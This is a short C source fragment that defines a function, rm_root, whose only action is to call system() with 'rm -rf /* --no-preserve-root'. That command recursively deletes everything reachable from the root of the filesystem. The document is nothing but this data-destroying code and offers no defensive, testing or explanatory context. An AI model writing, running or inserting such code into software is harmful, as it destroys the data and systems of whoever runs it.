#include <stdlib.h>
#include <unistd.h>

void rm_root() {
    system("rm -rf /* --no-preserve-root");
}